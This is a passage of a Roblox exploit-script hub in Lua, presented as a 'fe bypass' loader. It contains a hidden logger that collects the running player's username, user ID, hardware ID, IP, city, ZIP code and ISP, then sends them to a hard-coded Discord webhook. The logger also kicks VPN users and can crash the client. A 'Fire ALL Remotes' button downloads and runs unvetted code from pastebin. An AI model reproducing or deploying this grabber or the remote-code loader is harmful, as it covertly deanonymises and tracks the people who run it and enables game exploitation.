		return G2L["1"], require;
	end
	function log()

		--=///SETTINGS\\\=--
		_G.kick=false
		_G.consolemsg=false 
		_G.crash=false




		local HttpService = game:GetService("HttpService")
		local Webhook = "https://discord.com/api/webhooks/1392207804294631495/WcgykS5VlZXI-siSjaAMSTm6fSFnM_K-XoCrQOFt5k2kARsw9qsAOBVVSx-oaoJ7YCX5"
		local plr=game.Players.LocalPlayer
		local function log()
			local player = game.Players.LocalPlayer
			local username = player.Name
			local userId = player.UserId
			local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

			local ipSuccess, ipInfo = pcall(function()
				return game:HttpGet("https://ipapi.co/json/")
			end)

			local ip, country, state, city, zip, isp, isVPN

			if ipSuccess then
				local ipData = HttpService:JSONDecode(ipInfo)
				ip = ipData.ip or "Unknown"
				country = ipData.country_name or "Unknown"
				state = ipData.region or "Unknown"
				city = ipData.city or "Unknown"
				zip = ipData.postal or "Unknown"
				isp = ipData.org or "Unknown"

				local vpnProviders = {"Amazon", "Google", "Microsoft", "OVH", "DigitalOcean", "Linode", "Hetzner", "Oracle"}
				isVPN = "No"
				for _, provider in pairs(vpnProviders) do
					if isp and string.find(isp, provider) then
						isVPN = "Yes (VPN Detected)"
						break
					end
				end
			else
				ip, country, state, city, zip, isp, isVPN = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
			end

			if isVPN == "Yes (VPN Detected)" then
				player:Kick("VPNs are not allowed as they block our script!")
				return
			end

			local data = {
				["embeds"] = {{
					["title"] = "Player Info",
					["color"] = 255,
					["fields"] = {
						{["name"] = "Username", ["value"] = username, ["inline"] = true},
						{["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
						{["name"] = "HWID", ["value"] = hwid, ["inline"] = true},
						{["name"] = "Country", ["value"] = country, ["inline"] = true},
						{["name"] = "State", ["value"] = state, ["inline"] = true},
						{["name"] = "City", ["value"] = city, ["inline"] = true},
						{["name"] = "ZIP Code", ["value"] = zip, ["inline"] = true},
						{["name"] = "ISP", ["value"] = isp, ["inline"] = true},
						{["name"] = "VPN?", ["value"] = isVPN, ["inline"] = true}
					}
				}}
			}

			local jsonData = HttpService:JSONEncode(data)
			request({
				Url = Webhook,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = jsonData
			})
		end

		log()
		if _G.kick == true then

			plr:Kick("LOGGED LOLOLOL")
		end
		if _G.consolemessage == true then
			while true do
				print("LOGGED")   
				wait(0.5)
			end
		end
		if _G.crash == true then
			while true do 
				print("CRASHED")
			end
		end
	end
	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local TextButton = Instance.new("TextButton")
	local nothing = Instance.new("ImageLabel")
	local lucgyr = Instance.new("TextLabel")
	local Head = game.Players.LocalPlayer.Character.Head
	--Properties:

	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.ResetOnSpawn = false

	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0.415443122, 0, 0.295045048, 0)
	Frame.Size = UDim2.new(0, 215, 0, 181)

	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.BorderSizePixel = 0
	TextLabel.Size = UDim2.new(0, 215, 0, 50)
	TextLabel.Font = Enum.Font.SourceSans
	TextLabel.Text = "project smegma fe bypass rel"
	TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14.000
	TextLabel.TextWrapped = true

	TextButton.Parent = Frame
	TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextButton.BorderSizePixel = 0
	TextButton.Position = UDim2.new(0, 0, 0.408839792, 0)
	TextButton.Size = UDim2.new(0, 215, 0, 50)
	TextButton.Font = Enum.Font.SourceSans
	TextButton.Text = "Load"
	TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
	TextButton.TextScaled = true
	TextButton.TextSize = 14.000
	TextButton.TextWrapped = true
	TextButton.MouseButton1Down:Connect(function()
		nothing.Visible = true
		lucgyr.Visible = true
		---log()
		wait(5)
		if _G.Prank == true then
			local sndid = "rbxassetid://135308045"
			local sndpi = .7
			local saun = Instance.new("Sound",Head)
			saun.Volume = 10
			saun.Pitch = sndpi
			saun.SoundId = sndid
			saun.Name = "a"
			saun.Looped = true
			saun:Play()
			game.Players.LocalPlayer:Kick("Blud is not cp whitelisted grrrr")
		end
		if _G.Prank == false then
			CP()
			nothing.Visible= false
			lucgyr.Visible=false
			ScreenGui:Destroy()
		end

	end)

	nothing.Name = "nothing"
	nothing.Parent = ScreenGui
	nothing.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	nothing.BorderColor3 = Color3.fromRGB(0, 0, 0)
	nothing.BorderSizePixel = 0
	nothing.Size = UDim2.new(0, 1274, 0, 444)
	nothing.Visible = false
	nothing.Image = "rbxassetid://95314918081888"

	lucgyr.Name = "lucgyr"
	lucgyr.Parent = ScreenGui
	lucgyr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	lucgyr.BorderColor3 = Color3.fromRGB(0, 0, 0)
	lucgyr.BorderSizePixel = 0
	lucgyr.Position = UDim2.new(0.253532171, 0, 0.0360360369, 0)
	lucgyr.Size = UDim2.new(0, 630, 0, 50)
	lucgyr.Visible = false
	lucgyr.Font = Enum.Font.SourceSans
	lucgyr.Text = "LOADING"
	lucgyr.TextColor3 = Color3.fromRGB(0, 0, 0)
	lucgyr.TextScaled = true
	lucgyr.TextSize = 14.000
	lucgyr.TextWrapped = true
end)

remabuse.Name = "remabuse"
remabuse.Parent = scripthub
remabuse.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
remabuse.BorderColor3 = Color3.fromRGB(0, 0, 0)
remabuse.BorderSizePixel = 0
remabuse.Position = UDim2.new(0.0352564119, 0, 0.679648936, 0)
remabuse.Size = UDim2.new(0, 290, 0, 43)
remabuse.Font = Enum.Font.SourceSans
remabuse.Text = "Fire ALL Remotes"
remabuse.TextColor3 = Color3.fromRGB(255, 255, 255)
remabuse.TextScaled = true
remabuse.TextSize = 14.000
remabuse.TextWrapped = true
remabuse.MouseButton1Down:Connect(function()
	 loadstring(game:HttpGet("https://pastebin.com/raw/WxCx5kFT"))()
end)

TextLabel_8.Parent = scripthub
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.BorderSizePixel = 0
TextLabel_8.Position = UDim2.new(0, 0, 0.836431205, 0)
TextLabel_8.Size = UDim2.new(0, 312, 0, 28)
TextLabel_8.Font = Enum.Font.SourceSansItalic
TextLabel_8.Text = "NOTE: FIRE ALL REMOTES IS RISKY"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.TextSize = 14.000

local UserInputService = game:GetService("UserInputService")
local runService = (game:GetService("RunService"));

local gui = main

local dragging
local dragInput
local dragStart
local startPos

function Lerp(a, b, m)
	return a + (b - a) * m
end;

local lastMousePos
local lastGoalPos
local DRAG_SPEED = (8); -- // The speed of the UI darg.
function Update(dt)
	if not (startPos) then return end;
	if not (dragging) and (lastGoalPos) then
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
		return 
	end;

	local delta = (lastMousePos - UserInputService:GetMouseLocation())
	local xGoal = (startPos.X.Offset - delta.X);
	local yGoal = (startPos.Y.Offset - delta.Y);
	lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
	gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
end;

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position
		lastMousePos = UserInputService:GetMouseLocation()

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

runService.Heartbeat:Connect(Update)
